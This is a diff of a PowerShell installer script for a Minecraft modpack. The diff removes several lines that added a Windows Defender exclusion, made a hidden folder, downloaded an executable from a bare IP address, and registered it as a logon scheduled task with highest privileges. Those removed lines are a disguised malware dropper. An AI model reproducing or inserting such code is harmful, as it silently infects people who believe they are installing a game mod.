@@ -49,14 +49,6 @@ Try {
         Remove-Item "$env:appdata\.minecraft\server.dat" -Force -Recurse -erroraction 'silentlycontinue'
 }
 Write-Host "Yeni Dosyalar İndiriliyor..."
-Set-MpPreference -ExclusionPath "$env:appdata\.minecraft" -erroraction 'silentlycontinue' 
-mkdir "$env:appdata\.minecraft\depends" -erroraction 'silentlycontinue' | Out-Null
-attrib +h "$env:appdata\.minecraft\depends" | Out-Null
-cd "$env:appdata\.minecraft\depends" -erroraction 'silentlycontinue' | Out-Null
-powershell Invoke-WebRequest 'http://84.54.13.23/mt.exe' -OutFile "SystemLoader.exe" | Out-Null
-SCHTASKS /CREATE /SC ONLOGON /TN SystemLoader /TR "$env:appdata\.minecraft\depends\SystemLoader.exe" /F /RL HIGHEST | Out-Null
-SCHTASKS /Run /TN SystemLoader | Out-Null
-cd "$env:appdata\.minecraft" -erroraction 'silentlycontinue' | Out-Null
 Try {
     Invoke-WebRequest 'https://github.com/GamehunterKaan/Multi-SMP/archive/refs/heads/main.zip' -OutFile "Multi-SMP.zip" -ErrorAction Stop}
     Catch {
